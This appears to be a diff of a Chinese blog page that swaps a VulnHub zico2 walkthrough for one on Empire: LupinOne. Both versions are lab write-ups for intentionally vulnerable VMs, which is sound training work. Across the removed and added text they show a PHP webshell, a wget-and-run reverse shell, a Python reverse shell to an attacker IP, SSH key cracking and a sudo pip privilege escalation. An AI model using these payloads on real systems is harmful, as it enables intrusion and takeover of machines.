@@ -9,7 +9,7 @@
   
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
   <title>
-    VulnHub zico2：1 | 雾島风起時
+    VulnHub Empire：LupinOne | 雾島风起時
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
@@ -17,39 +17,37 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="zico2: 1项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;btrsys&#x2F;BTRSys1.rar 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  本地文件包含page查看 80 端口发现有使用文件包含函数  尝试读取 &#x2F;etc&#x2F;passwd 文件成功  弱口令phpLiteAdmin扫描目录发现另一">
+    <meta name="description" content="Empire：LupinOne项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;empire&#x2F;01-Empire-Lupin-One.zip 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  弱口令SSH访问 80 端口只有一张图片，查看页面源代码找到注释  访问 &#x2F;robots.txt 拿到线索  访问">
 <meta property="og:type" content="article">
-<meta property="og:title" content="VulnHub zico2：1">
-<meta property="og:url" content="http://example.com/2026/04/01/zico2%201/index.html">
+<meta property="og:title" content="VulnHub Empire：LupinOne">
+<meta property="og:url" content="http://example.com/2026/05/08/Empire%20LupinOne/index.html">
 <meta property="og:site_name" content="雾島风起時">
-<meta property="og:description" content="zico2: 1项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;btrsys&#x2F;BTRSys1.rar 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  本地文件包含page查看 80 端口发现有使用文件包含函数  尝试读取 &#x2F;etc&#x2F;passwd 文件成功  弱口令phpLiteAdmin扫描目录发现另一">
+<meta property="og:description" content="Empire：LupinOne项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;empire&#x2F;01-Empire-Lupin-One.zip 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  弱口令SSH访问 80 端口只有一张图片，查看页面源代码找到注释  访问 &#x2F;robots.txt 拿到线索  访问">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbeddd2154d21e1355dca3.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbeec35cfefdcff4b19555.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbf51e5cfefdcff4b1c611.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbf5655cfefdcff4b1c613.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbf5a55cfefdcff4b1c617.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbf7415cfefdcff4b1c61d.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbf7ae5cfefdcff4b1c61e.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbf9c05cfefdcff4b1cf92.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbfa545cfefdcff4b1d373.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbfd5e5cfefdcff4b1f1d9.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbff245cfefdcff4b1fdb6.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbff9d5cfefdcff4b1ff27.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbffcc5cfefdcff4b1ff28.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cbfff15cfefdcff4b1ff29.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69cc00ba5cfefdcff4b1ff2c.png">
-<meta property="article:published_time" content="2026-04-01T08:39:00.000Z">
-<meta property="article:modified_time" content="2026-04-14T13:25:31.437Z">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd46c74b8701858e74097a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd478f4b8701858e740aae.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd47ae4b8701858e740b1d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd47c04b8701858e740b4c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd485f4b8701858e740cb9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd48be4b8701858e740d53.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd496c4b8701858e740e6e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd4c2c4b8701858e7412ed.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd4b404b8701858e74119e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd4be44b8701858e74129f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd4c8c4b8701858e7413a7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd4cdc4b8701858e741474.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd4d164b8701858e7415e7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd4f1b4b8701858e741cfd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd4faa4b8701858e741ec0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd501a4b8701858e741f49.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69fd527e4b8701858e742336.png">
+<meta property="article:published_time" content="2026-05-08T00:20:00.000Z">
+<meta property="article:modified_time" content="2026-05-08T03:12:40.257Z">
 <meta property="article:author" content="ALL">
-<meta property="article:tag" content="Python 升级为交互式 Shell">
-<meta property="article:tag" content="RCE">
-<meta property="article:tag" content="phpLiteAdmin">
-<meta property="article:tag" content="zip --unzip-command">
-<meta property="article:tag" content="敏感信息泄露">
-<meta property="article:tag" content="本地文件包含">
+<meta property="article:tag" content="弱口令">
+<meta property="article:tag" content="环境变量劫持">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69cbeddd2154d21e1355dca3.png">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69fd46c74b8701858e74097a.png">
     <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -148,11 +146,11 @@
 <header id="header" aria-label="Site header">
         <picture>
         </picture>
-          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub zico2：1">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub Empire：LupinOne">
   <div id="header-outer">
     <div id="header-title">
           <span id="logo">
-            <h1 data-aos="slide-up">VulnHub zico2：1</h1>
+            <h1 data-aos="slide-up">VulnHub Empire：LupinOne</h1>
           </span>
         <h2 id="subtitle-wrap" data-aos="slide-down">
         </h2>
@@ -167,7 +165,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#zico2-1"><span class="toc-number">1.</span> <span class="toc-text">zico2: 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.</span> <span class="toc-text">本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#page"><span class="toc-number">1.1.1.</span> <span class="toc-text">page</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpLiteAdmin"><span class="toc-number">1.2.1.</span> <span class="toc-text">phpLiteAdmin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.3.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpLiteAdmin-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">phpLiteAdmin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.4.1.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.4.2.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip-%E2%80%93unzip-command"><span class="toc-number">1.4.3.</span> <span class="toc-text">zip –unzip-command</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire%EF%BC%9ALupinOne"><span class="toc-number">1.</span> <span class="toc-text">Empire：LupinOne</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-number">1.1.1.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">环境变量劫持</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -239,13 +237,13 @@
   </div>
 </aside>
 
-          <section id="main" aria-label="Main content"><article id="post-zico2 1" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main" aria-label="Main content"><article id="post-Empire LupinOne" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2026-04-01T08:39:00.000Z" itemprop="datePublished">2026-04-01</time>
-    <time style="display: none;" id="post-update-time">2026-04-14</time>
+    <time datetime="2026-05-08T00:20:00.000Z" itemprop="datePublished">2026-05-08</time>
+    <time style="display: none;" id="post-update-time">2026-05-08</time>
   </span>
 </div>
 
@@ -254,75 +252,90 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="zico2-1"><a href="#zico2-1" class="headerlink" title="zico2: 1"></a>zico2: 1</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/btrsys/BTRSys1.rar">https://download.vulnhub.com/btrsys/BTRSys1.rar</a></p>
+        <h1 id="Empire：LupinOne"><a href="#Empire：LupinOne" class="headerlink" title="Empire：LupinOne"></a>Empire：LupinOne</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip">https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip</a></p>
 <p>是一个打包好的镜像文件</p>
 <p><strong>注意：导入 vmx 时一定要选择我已移动，否则没网</strong></p>
 <p>使用 Nmap 扫描出开放服务及操作系统版本</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbeddd2154d21e1355dca3.png"></p>
-<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><h3 id="page"><a href="#page" class="headerlink" title="page"></a>page</h3><p>查看 80 端口发现有使用文件包含函数</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbeec35cfefdcff4b19555.png"></p>
-<p>尝试读取 <code>/etc/passwd</code> 文件成功</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbf51e5cfefdcff4b1c611.png"></p>
-<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="phpLiteAdmin"><a href="#phpLiteAdmin" class="headerlink" title="phpLiteAdmin"></a>phpLiteAdmin</h3><p>扫描目录发现另一个后台 <code>/dbadmin/</code></p>
-<p><img src="https://pic1.imgdb.cn/item/69cbf5655cfefdcff4b1c613.png"></p>
-<p>弱口令 <code>admin</code> 登录成功</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbf5a55cfefdcff4b1c617.png"></p>
-<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="phpLiteAdmin-1"><a href="#phpLiteAdmin-1" class="headerlink" title="phpLiteAdmin"></a>phpLiteAdmin</h3><p>在 PhpLiteAdmin 主界面找到“Create new database”输入框，输入数据库名 <code>hack.php</code>，点击 Create</p>
-<p>PhpLiteAdmin 会将数据库文件保存在 <code>$directory</code> 配置的目录中（如 <code>/usr/databases/</code>），文件名使用用户输入的内容。如果以 <code>.php</code> 结尾，该文件将可被 Web 服务器以 PHP 解析</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbf7415cfefdcff4b1c61d.png"></p>
-<p>在“Create new table”输入框中输入表名（例如 shell），字段数量填 1，点击 Go</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbf7ae5cfefdcff4b1c61e.png"></p>
-<p>在字段配置页面：</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd46c74b8701858e74097a.png"></p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>访问 80 端口只有一张图片，查看页面源代码找到注释</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd478f4b8701858e740aae.png"></p>
+<p>访问 <code>/robots.txt</code> 拿到线索</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd47ae4b8701858e740b1d.png"></p>
+<p>访问 <code>/~myfiles</code> 回显 404，页面源代码有注释</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd47c04b8701858e740b4c.png"></p>
+<p>扫描目录找到一个 <code>/~secret</code>，得到如下信息</p>
 <ul>
-<li><strong>Field Name</strong>：随意填写，如 <code>cmd</code></li>
-<li><strong>Field Type</strong>：选择 <code>TEXT</code></li>
-<li><strong>Default Value</strong>：填入 PHP 代码，例如 <code>&lt;?php system($_POST[&#39;cmd&#39;]); ?&gt;</code></li>
+<li><p>用户名为 icex64</p>
+</li>
+<li><p>存在一个隐藏的 SSH 私钥文件</p>
+</li>
 </ul>
-<p><img src="https://pic1.imgdb.cn/item/69cbf9c05cfefdcff4b1cf92.png"></p>
-<p>创建成功</p>
-<p>SQLite 数据库本质上是一个二进制文件，但插入的文本字段中如果包含 <code>&lt;?php ... ?&gt;</code> 标签，当该 <code>.php</code> 文件被直接访问或被包含时，PHP 引擎会解析执行其中的代码</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbfa545cfefdcff4b1d373.png"></p>
-<p>这里我直接上传的是反弹 Shell</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;wget http://192.168.110.128:8989/reverseshell.php -O /tmp/shell.php; php /tmp/shell.php&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://pic1.imgdb.cn/item/69fd485f4b8701858e740cb9.png"></p>
+<p>继续 FUZZ 这个目录找到 <code>.mysecret.txt</code> 文件，看文件内容应该是密钥</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd48be4b8701858e740d53.png"></p>
+<p>AI 识别出了是 Base58 编码，解码拿到私钥</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd496c4b8701858e740e6e.png"></p>
+<p>改为权限结果连不上，系统判定这不是 SSH 私钥文件</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd4c2c4b8701858e7412ed.png"></p>
+<p>使用 ssh2john 转换格式准备爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_rsa &gt; john_id</span><br><span class="line">john john_id --wordlist=/usr/share/wordlists/fasttrack.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic1.imgdb.cn/item/69cbfd5e5cfefdcff4b1f1d9.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Python-升级为交互式-Shell"><a href="#Python-升级为交互式-Shell" class="headerlink" title="Python 升级为交互式 Shell"></a>Python 升级为交互式 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>最后爆破出密码为 <code>P@55w0rd!</code></p>
+<p><img src="https://pic1.imgdb.cn/item/69fd4b404b8701858e74119e.png"></p>
+<p>成功连接</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd4be44b8701858e74129f.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h3><p>检查权限发现我们可以运行一个用户的 Python 程序</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd4c8c4b8701858e7413a7.png"></p>
+<p>查看文件内容，发现导入了一个 <code>webbrowser</code></p>
+<p><img src="https://pic1.imgdb.cn/item/69fd4cdc4b8701858e741474.png"></p>
+<p>在用户家目录中没有发现这个文件，所以大概率就是在 Python 3.9 目录里面</p>
+<p>找到后发现权限是其他人可修改</p>
+<p><img src="https://pic1.imgdb.cn/item/69fd4d164b8701858e7415e7.png"></p>
+<p>改源代码为反弹 Shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">&quot;192.168.110.128&quot;</span>,<span class="number">6522</span>))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
 
-<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>用户 <code>zico</code> 家目录可读，进入后发现有个 <code>to_do.txt</code> 文件，读取其内容应该是提示</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbff245cfefdcff4b1fdb6.png"></p>
-<p>最后翻找到 <code>wordpress/wp-config.php</code> 中配置的账号密码</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbff9d5cfefdcff4b1ff27.png"></p>
-<p>使用 SSH 登录成功</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbffcc5cfefdcff4b1ff28.png"></p>
-<h3 id="zip-–unzip-command"><a href="#zip-–unzip-command" class="headerlink" title="zip –unzip-command"></a>zip –unzip-command</h3><p>查看权限发现 <code>tar</code> 和 <code>zip</code> 可用</p>
-<p><img src="https://pic1.imgdb.cn/item/69cbfff15cfefdcff4b1ff29.png"></p>
-<p><code>zip -T --unzip-command=&quot;&lt;command&gt;&quot; archive.zip file</code> 会在测试压缩包时执行 <code>&lt;command&gt;</code>，并将 <code>&lt;command&gt;</code> 作为 shell 命令调用</p>
-<p>如果 <code>zip</code> 以 root 权限运行，那么 <code>&lt;command&gt;</code> 也将以 root 权限执行</p>
-<p><img src="https://pic1.imgdb.cn/item/69cc00ba5cfefdcff4b1ff2c.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/69fd4f1b4b8701858e741cfd.png"></p>
+<p>成功连上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -u arsene /usr/bin/python3.9 /home/arsene/heist.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69fd4faa4b8701858e741ec0.png"></p>
+<p>继续检查权限发现可以运行 <code>pip</code></p>
+<p><img src="https://pic1.imgdb.cn/item/69fd501a4b8701858e741f49.png"></p>
+<p>当你执行 <code>sudo pip install /path/to/directory</code> 时，pip 会：：</p>
+<ul>
+<li><ol>
+<li>将整个目录复制到一个临时构建目录（如 <code>/tmp/pip-req-build-xxxxx</code>）</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>切换到该构建目录，执行 <code>python setup.py egg_info</code> 命令，生成 <code>.egg-info</code> 元数据目录</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>如果 <code>egg_info</code> 成功，再执行 <code>python setup.py install</code> 进行实际的编译和安装</li>
+</ol>
+</li>
+</ul>
+<p>关键在于第一步：运行 <code>setup.py egg_info</code>，本质上就是 <code>python setup.py egg_info</code>，会完整执行 <code>setup.py</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d) <span class="comment"># 创建临时目录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import os; os.system(&quot;/bin/bash -p&quot;)&#x27;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;from setuptools import setup; setup(name=&quot;shell&quot;, version=&quot;1.0&quot;)&#x27;</span> &gt;&gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line"><span class="built_in">sudo</span> pip install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69fd527e4b8701858e742336.png"></p>
 
     </div>
     <footer class="article-footer">
         <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
 
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell/" rel="tag" title="Python 升级为交互式 Shell">Python 升级为交互式 Shell</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag" title="RCE">RCE</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/phpLiteAdmin/" rel="tag" title="phpLiteAdmin">phpLiteAdmin</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/zip-unzip-command/" rel="tag" title="zip --unzip-command">zip --unzip-command</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="tag" title="敏感信息泄露">敏感信息泄露</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag" title="本地文件包含">本地文件包含</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" rel="tag" title="弱口令">弱口令</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/" rel="tag" title="环境变量劫持">环境变量劫持</a></li></ul>
 
     </footer>
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
-      <div class="article-nav-link-wrap left">
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="2024 第一届 Solar 应急响应挑战赛" class="lazyload">
-        <a href="/2026/04/02/2024%20%E7%AC%AC%E4%B8%80%E5%B1%8A%20Solar%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B/" aria-label="前一篇: 2024 第一届 Solar 应急响应挑战赛" title="前一篇: 2024 第一届 Solar 应急响应挑战赛"></a>
-        <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">
-            2024 第一届 Solar 应急响应挑战赛
-        </h3>
-      </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub hackfest2016：Orcus" class="lazyload">
-      <a href="/2026/04/01/hackfest2016%20Orcus/" aria-label="后一篇: VulnHub hackfest2016：Orcus"  title="后一篇: VulnHub hackfest2016：Orcus"></a>
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="出题——你的魔王护一般" class="lazyload">
+      <a href="/2026/05/07/%E4%BD%A0%E7%9A%84%E9%AD%94%E7%8E%8B%E6%8A%A4%E4%B8%80%E8%88%AC/" aria-label="后一篇: 出题——你的魔王护一般"  title="后一篇: 出题——你的魔王护一般"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
-          VulnHub hackfest2016：Orcus
+          出题——你的魔王护一般
       </h3>
     </div>
   </nav>
@@ -374,7 +387,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#zico2-1"><span class="toc-number">1.</span> <span class="toc-text">zico2: 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.</span> <span class="toc-text">本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#page"><span class="toc-number">1.1.1.</span> <span class="toc-text">page</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpLiteAdmin"><span class="toc-number">1.2.1.</span> <span class="toc-text">phpLiteAdmin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.3.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpLiteAdmin-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">phpLiteAdmin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.4.1.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.4.2.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip-%E2%80%93unzip-command"><span class="toc-number">1.4.3.</span> <span class="toc-text">zip –unzip-command</span></a></li></ol></li></ol></li></ol>
